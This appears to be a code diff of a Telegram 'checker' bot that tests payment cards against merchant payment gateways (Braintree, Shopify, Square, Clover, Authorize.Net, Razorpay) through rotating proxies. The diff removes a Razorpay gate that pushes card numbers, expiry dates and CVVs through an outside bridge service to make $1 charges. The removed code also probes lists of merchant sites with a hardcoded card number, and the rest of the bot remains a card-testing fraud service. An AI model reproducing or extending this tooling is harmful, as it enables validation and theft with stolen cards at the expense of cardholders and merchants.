@@ -51,8 +51,7 @@ from gates.auth import (
     check_card_dila,
     check_card_nemaneide,
     check_card_inu,
-    check_card_brccn,
-    check_card_ba
+    check_card_brccn
 )
 from gates.charge import (
     check_card_shp10,
@@ -71,7 +70,6 @@ from gates.charge import (
     _parse_square_url,
     _extract_square_result,
     check_card_clover,
-    check_card_rz,
     check_card_authorize,
     check_card_autoshopify
 )
@@ -187,26 +185,11 @@ VERIFIED_FILE = "verified_users.txt"
 USER_SITES_FILE = 'user_sites.json'
 KEYS_FILE = "keys.txt"
 DAILY_USAGE_FILE = "daily_usage.json"
-#  TOP PE ADD KARO (SITES_FILE ke neeche):
-RZ_SITES_FILE = 'rz_sites.txt'
-DEFAULT_SQUARE_SITE = "https://checkout.square.site/merchant/MLR1YP75V68E5/checkout/K2D6LMLJIZFOQULVTVCNGIMV"
-
-def get_square_sites():
-    sites = get_file_lines(SQUARE_SITES_FILE)
-    if not sites:
-        sites = [DEFAULT_SQUARE_SITE]
-    return sites
-
-PHOTO_URL = "https://i.postimg.cc/pdYQxY74/Alone.png"  #    Link
-# Initialize bot
+PHOTO_URL = "https://i.postimg.cc/pdYQxY74/Alone.png"
 bot = TelegramClient('freaky_checker_bot', API_ID, API_HASH)
-# RAZORPAY SINGLE SITE (koi sites1.txt nahi)
-RAZORPAY_FIXED_SITE = "https://pages.razorpay.com/BusinessGarh?fbclid=PAAaYBPBDRDVaPZMu7kXaq1a2mNOIiXxEJ1usxIxxdbAJYt3q75QWhHXFZeh8_aem_AXQuIpg6pqBI2mXplIaDgYU0ztY4jF0C97qV1RPZF6WzfWeZy93K9u0Gv1wbTWYDpRs%20Ye%20lagan%20he%20to/pl_Eg24W0HLznkELl/view"  # Tera strong link
-RAZORPAY_API_BASE = "https://auto-razorpay-nano.vercel.app/hit"
 
 active_sessions = {}
 
-# === GROUP FIX HELPER ===
 async def send_to_chat(chat_id, text, **kwargs):
     """Group aur Private dono mein sahi reply bhejta hai"""
     try:
@@ -221,41 +204,7 @@ async def send_to_chat(chat_id, text, **kwargs):
             await bot.send_message(chat_id, text, **kwargs)
         except:
             pass
-        
-_DEAD_INDICATORS = (
-    'receipt id is empty', 'handle is empty', 'product id is empty',
-    'tax amount is empty', 'payment method identifier is empty',
-    'invalid url', 'error in 1st req', 'error in 1 req',
-    'cloudflare', 'connection failed', 'timed out',
-    'access denied', 'tlsv1 alert', 'ssl routines',
-    'could not resolve', 'domain name not found',
-    'name or service not known', 'openssl ssl_connect',
-    'empty reply from server', 'httperror504', 'http error',
-    'timeout', 'unreachable', 'ssl error',
-    '502', '503', '504', 'bad gateway', 'service unavailable',
-    'gateway timeout', 'network error', 'connection reset',
-    'failed to detect product', 'failed to create checkout',
-    'failed to tokenize card', 'failed to get proposal data',
-    'submit rejected', 'submit rejected:','handle error', 'http 404',
-    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
-    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
-    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
-    'all products sold out', 'no_session_token', 'tokenize_fail',
-)
-# --- UPDATED LOADING FUNCTIONS ---
-def load_razorpay_sites():
-    sites = [RAZORPAY_FIXED_SITE]
-    try:
-        from db import get_db_rz_sites
-        db_sites = get_db_rz_sites()
-        for s in db_sites:
-            if s not in sites:
-                sites.append(s)
-    except Exception:
-        pass
-    return sites
 
-    
 def get_file_lines(filepath):
     """Helper to read lines from a file fresh every time"""
     if not os.path.exists(filepath):
@@ -1389,232 +1338,7 @@ async def clear_user_sites_cmd(event):
 
 
 
-# ==================== /addrzsites - RAZORPAY SITE ADD ====================
-async def check_single_rz_site(site: str, proxy: str) -> bool:
-    """Verifies if a Razorpay payment page URL is active via Razorpay bridge"""
-    site = site.strip()
-    if not site.startswith("http://") and not site.startswith("https://"):
-        site = f"https://{site}"
-    test_card = "5154623245618097|03|2032|156"
-    base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount=1&cc={test_card}&proxy={proxy}"
-    try:
-        timeout = aiohttp.ClientTimeout(total=20)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(base_url, ssl=False) as resp:
-                raw_text = await resp.text()
-                if not raw_text or len(raw_text) < 10:
-                    return False
-                try:
-                    raw = json.loads(raw_text)
-                except Exception:
-                    return False
-                response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
-                dead_indicators = ['error', 'invalid', 'dead', 'failed', 'timeout', 'not found', 'bad gateway', 'cloudflare', 'captcha', 'connection', 'refused']
-                if any(x in response_msg for x in dead_indicators):
-                    return False
-                return True
-    except Exception:
-        return False
 
-
-@bot.on(events.NewMessage(pattern=r'^/addrzsites(?:\s+(.+))?$'))
-async def add_razorpay_site(event):
-    user_id = event.sender_id
-    raw_args = event.pattern_match.group(1)
-    sites_to_test = []
-
-    # 1. Check if replying to a file or message
-    if event.is_reply:
-        reply_msg = await event.get_reply_message()
-        if reply_msg and reply_msg.file:
-            try:
-                file_path = await reply_msg.download_media()
-                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                    file_content = await f.read()
-                try: os.remove(file_path)
-                except: pass
-
-                extracted = re.findall(r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?:/[^\s]*)?', file_content)
-                sites_to_test.extend(extracted)
-            except Exception as e:
-                await event.reply(f" Error reading site file: {e}")
-                return
-
-    # 2. Extract sites from command text if provided
-    if raw_args:
-        text_sites = re.findall(r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?:/[^\s]*)?', raw_args)
-        sites_to_test.extend(text_sites)
-
-    # Clean & deduplicate site list
-    sites_to_test = list(dict.fromkeys([s.strip() for s in sites_to_test if s.strip()]))
-
-    if not sites_to_test:
-        await event.reply("""<b>RAZORPAY SITE ADDER</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Usage:</b>
-1. Reply <code>/addrzsites</code> to a <code>.txt</code> file containing Razorpay site links.
-2. <code>/addrzsites https://pages.razorpay.com/your_link</code>
-3. Send multiple URLs separated by newlines.""", parse_mode="html")
-        return
-
-    status_msg = await event.reply(f" <b>Testing & Adding {len(sites_to_test)} Razorpay Sites...</b>", parse_mode="html")
-
-    proxies = load_proxies(user_id)
-    if not proxies:
-        await status_msg.edit(" No proxies available to test sites!")
-        return
-
-    from db import add_db_rz_site, get_db_rz_sites
-    existing_sites = set(get_db_rz_sites())
-
-    alive_added = 0
-    dead_count = 0
-
-    batch_size = 20
-    for i in range(0, len(sites_to_test), batch_size):
-        batch = sites_to_test[i:i + batch_size]
-        tasks = [check_single_rz_site(s, random.choice(proxies)) for s in batch]
-        results = await asyncio.gather(*tasks)
-
-        for site_url, is_alive in zip(batch, results):
-            if not site_url.startswith("http"):
-                site_url = f"https://{site_url}"
-            if is_alive:
-                if site_url not in existing_sites:
-                    add_db_rz_site(site_url)
-                    existing_sites.add(site_url)
-                    alive_added += 1
-            else:
-                dead_count += 1
-
-    await status_msg.edit(f"""<b>RAZORPAY SITES BATCH COMPLETE</b>
-━━━━━━━━━━━━━━━━━━━━
- <b>Added Active Sites:</b> <code>{alive_added}</code>
-[WARN] <b>Dead / Invalid Sites:</b> <code>{dead_count}</code>
-📊 <b>Total RZ Sites in DB:</b> <code>{len(existing_sites)}</code>
-
-💡 <code>/rzsites</code> to view all active sites.""", parse_mode="html")
-
-
-
-# ==================== /rmrzsites - RAZORPAY SITE REMOVE ====================
-@bot.on(events.NewMessage(pattern=r'^/rmrzsites\s+(.+)'))
-async def remove_razorpay_site(event):
-    user_id = event.sender_id
-    site_to_remove = event.pattern_match.group(1).strip()
-
-    if not site_to_remove.startswith("http"):
-        site_to_remove = f"https://{site_to_remove}"
-
-    from db import get_db_rz_sites, remove_db_rz_site
-    current_rz = get_db_rz_sites()
-
-    if not current_rz:
-        await event.reply(" No custom Razorpay sites found!\nUse /addrzsites url to add.", parse_mode="html")
-        return
-
-    found = None
-    for s in current_rz:
-        if site_to_remove in s or s in site_to_remove:
-            found = s
-            break
-
-    target = found if found else site_to_remove
-
-    if remove_db_rz_site(target):
-        await event.reply(f" Removed Razorpay site:\n<code>{target[:60]}</code>\n\n💡 /addrzsites url | /rzsites", parse_mode="html")
-    else:
-        await event.reply(f" Site not found in RZ list:\n<code>{target[:60]}</code>", parse_mode="html")
-
-
-
-@bot.on(events.NewMessage(pattern=r'^/rzsites$'))
-async def rz_sites_check(event):
-    user_id = event.sender_id
-
-    sites = load_razorpay_sites()
-    proxies = load_proxies(user_id)
-    
-    if not sites:
-        await event.reply(" No Razorpay sites saved!\nUse /addrzsites url to add.")
-        return
-
-    
-    if not proxies:
-        await event.reply(" No proxies.")
-        return
-
-    msg = await event.reply(f"""<b>RZ Site Checker</b>
-
-📊 Total Sites: <code>{len(sites)}</code>
- Testing with Razorpay API...
-""", parse_mode="html")
-
-    alive = []
-    dead = []
-    checked = 0
-    test_card = "5154623245618097|03|2032|156"
-    
-    for site in sites:
-        checked += 1
-        proxy = random.choice(proxies)
-        
-        try:
-            base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount=1&cc={test_card}&proxy={proxy}"
-            
-            timeout = aiohttp.ClientTimeout(total=20)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                async with session.get(base_url, ssl=False) as resp:
-                    raw_text = await resp.text()
-                    
-                    if not raw_text or len(raw_text) < 10:
-                        dead.append(site)
-                        continue
-                    
-                    try:
-                        raw = json.loads(raw_text)
-                    except:
-                        dead.append(site)
-                        continue
-                    
-                    response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
-                    
-                    dead_indicators = ['error', 'invalid', 'dead', 'failed', 'timeout', 'not found', 'bad gateway', 'cloudflare', 'captcha', 'site not supported', 'connection', 'refused']
-                    
-                    if any(x in response_msg for x in dead_indicators):
-                        dead.append(site)
-                    else:
-                        alive.append(site)
-                        
-        except:
-            dead.append(site)
-        
-        if checked % 5 == 0 or checked == len(sites):
-            try:
-                await msg.edit(f"""<b>RZ Site Checker</b>
-
-📊 Total: <code>{len(sites)}</code>
- Working: <code>{len(alive)}</code>
- Dead: <code>{len(dead)}</code>
- Checked: <code>{checked}/{len(sites)}</code>""", parse_mode="html")
-            except: pass
-
-    if alive:
-        txt_file = "working_rz_sites.txt"
-        with open(txt_file, "w") as f:
-            for s in alive:
-                if not s.startswith("http"):
-                    s = "https://" + s
-                f.write(s + "\n")
-        await bot.send_message(user_id, f" **{len(alive)} Working RZ Sites**", file=txt_file)
-        os.remove(txt_file)
-
-    await msg.edit(f"""<b>RZ Site Check Complete</b>
-
-📊 Total: <code>{len(sites)}</code>
- Working: <code>{len(alive)}</code>
- Dead: <code>{len(dead)}</code>
- TXT File Sent """, parse_mode="html")
 
 # ==================== /proxy ====================
 @bot.on(events.NewMessage(pattern=r'^/proxy$'))
@@ -1803,64 +1527,7 @@ Or send multiline / reply to a message or file:
 
 
 
-@bot.on(events.NewMessage(pattern=r'^/rz\s*'))
-async def single_razorpay_cc(event):
-    user_id = event.sender_id
-    
-    if not await is_joined_channel(user_id):
-        await event.reply(" Pehle channel join karke verify karo!")
-        return
 
-    allowed, remaining = check_limits(user_id, False)
-    if not allowed:
-        await event.reply(" Daily limit khatam. Premium le lo.")
-        return
-
-    if len(event.message.text.strip()) <= 5:
-        await event.reply("Usage: `/rz 4097580790933573|06|2030|208`")
-        return
-
-    sites = load_razorpay_sites()
-    proxies = load_proxies(user_id)
-    if not sites or not proxies:
-        await event.reply(" Razorpay sites ya proxies missing.")
-        return
-
-    text = event.message.text or ""
-    parts = text.split(' ', 1)
-
-    if len(parts) < 2:
-        await event.reply(" Data missing")
-        return
-
-    cc_input = parts[1].strip()
-    cards = extract_cc(cc_input)
-    if not cards:
-        await event.reply(" Invalid CC format. Use: card|mm|yyyy|cvv")
-        return
-
-    try:
-        sender = await event.get_sender()
-    except:
-        sender = None
-
-    card = cards[0]
-    status_msg = await event.reply("""<b>Razorpay Checking...</b>""", parse_mode='html')
-
-    try:
-        start_time = time.time()
-        result = await check_card_razorpay(card, random.choice(proxies))
-        time_taken = round(time.time() - start_time, 2)
-        update_daily_usage(user_id, 1)
-
-        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0][:6])
-        response_msg = str(result.get('message', 'Unknown'))[:150]
-
-        status_emoji = "Approved! ✅ -» charged!" if result.get("status") == "Charged" else ("Approved! ✅" if result.get("status") == "Live" else "Declined! ❌")
-        res_msg = format_anime_result(card, status_emoji, response_msg, "Razorpay -» $1.00", brand, bin_type, level, bank, country, flag, time_taken, sender)
-        await status_msg.edit(res_msg, parse_mode="html")
-    except Exception as e:
-        await status_msg.edit(f"Error: {e}")
 
 
 
@@ -2022,34 +1689,7 @@ async def process_br1_cmd(event):
 
 
 
-# ==================== RAZORPAY NEW (rz1) ENGINE ====================
-@bot.on(events.NewMessage(pattern=r'^/rz1(?:\s+(.+))?$'))
-async def process_rz1_cmd(event):
-    user_id = event.sender_id
-    if not is_admin(event.sender_id):
-        await event.reply("Access denied.")
-        return
-    card_input = event.pattern_match.group(1)
-    if not card_input:
-        await event.reply("Format: `/rz1 cc|mm|yy|cvv`")
-        return
-    try:
-        parts = card_input.split('|')
-        cc, mm, yy, cvc = [p.strip() for p in parts[:4]]
-    except IndexError:
-        await event.reply("Format: `/rz1 cc|mm|yy|cvv`")
-        return
-    status_msg = await event.reply("<b>Processing Razorpay $1...</b>", parse_mode="html")
-    proxies = load_proxies(user_id)
-    proxy = random.choice(proxies) if proxies else None
-    start_time = time.time()
-    page_url = "https://razorpay.me/@tpstech"
-    st, msg, code, _ = await check_card_rz(page_url, cc, mm, yy, cvc, proxy_url=proxy)
-    time_taken = round(time.time() - start_time, 2)
-    brand, bin_type, level, bank, country, flag = await get_bin_info(cc[:6])
-    status_emoji = "Charged! 🟢 -» $1.00" if st == "live" else "Declined! ❌"
-    res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, msg, "Razorpay Charge -» $1.00", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
-    await status_msg.edit(res, parse_mode="html")
+
 
 
 
@@ -2905,8 +2545,8 @@ async def checker_menu_handler(event):
     gates_msg = """<b>Gates Menu</b>
 
 Browse the available categories:
-• <b>Auth Gates:</b> 7
-• <b>Charge Gates:</b> 17
+• <b>Auth Gates:</b> 6
+• <b>Charge Gates:</b> 16
 • <b>Mass Checker:</b> 6"""
 
     buttons = [
@@ -2943,10 +2583,7 @@ async def auth_info_handler(event):
 <b><i>Braintree Auth 1</i></b>
 <code>/inu cc|mm|yy|cvv</code>
 
-<b><i>Braintree Auth 2</i></b>
-<code>/ba cc|mm|yy|cvv</code>
-
-<b><i>Braintree Auth 3 (3DS)</i></b>
+<b><i>Braintree Auth 2 (3DS)</i></b>
 <code>/brccn cc|mm|yy|cvv</code> (or <code>/vbv</code>)"""
 
     buttons = [
@@ -3009,9 +2646,6 @@ async def charge_info_handler(event):
 
 <b><i>Clover Charge ($1.00)</i></b>
 <code>/cl site_url|cc|mm|yy|cvv</code>
-
-<b><i>Razorpay Charge ($1.00)</i></b>
-<code>/rz1 cc|mm|yy|cvv</code> (or <code>/rz</code>)
 
 <b><i>Authorize.Net Charge ($5.00)</i></b>
 <code>/an cc|mm|yy|cvv</code>"""
@@ -3884,10 +3518,9 @@ async def setup_bot_commands():
         commands = [
             BotCommand(command="start", description="Start bot & dashboard"),
             BotCommand(command="gates", description="View all gates categories"),
-            BotCommand(command="auth", description="View 7 Auth Gates"),
-            BotCommand(command="charge", description="View 17 Charge Gates"),
+            BotCommand(command="auth", description="View 6 Auth Gates"),
+            BotCommand(command="charge", description="View 16 Charge Gates"),
             BotCommand(command="mass", description="View 6 Mass Checkers"),
-            BotCommand(command="ba", description="Braintree Auth ($0.00)"),
             BotCommand(command="an", description="Authorize.Net Charge ($5.00)"),
             BotCommand(command="sh", description="Auto shopify(0.10$ - 5.00$)"),
             BotCommand(command="msh", description="Auto shopify(0.10$ - 5.00$) Mass"),
